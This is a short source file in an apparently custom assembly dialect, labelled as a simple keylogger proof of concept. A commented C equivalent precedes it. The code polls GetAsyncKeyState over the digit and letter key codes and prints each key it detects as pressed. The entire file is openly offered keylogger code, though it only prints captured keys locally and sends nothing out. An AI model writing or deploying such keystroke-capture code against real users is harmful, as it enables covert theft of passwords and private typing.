; Simple PASM keylogger POC
; by patate

; //https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes

; -----------------------------------
; Keys 0 to 9 and A to Z
; -----------------------------------
; for (int i = 48; i < 91; i++) {
;     if (i >= 58 && i <= 64) {
;       continue;
;     }
;     if (GetAsyncKeyState(i) & 0x8000) {
;       printf("%c", i);
;     }
; }

main:
mov a1, 47

loop:
add a1, 1
cmp a1, 90
ja main

cmp a1, 58
jb 3
cmp a1, 65
jb loop

push a1 ;vKey
call GetAsyncKeyState
and eax, 32768 ;0x8000
cmp eax, 0
je loop

push a1
push 1
call put

push \n
push 1
call put
jmp loop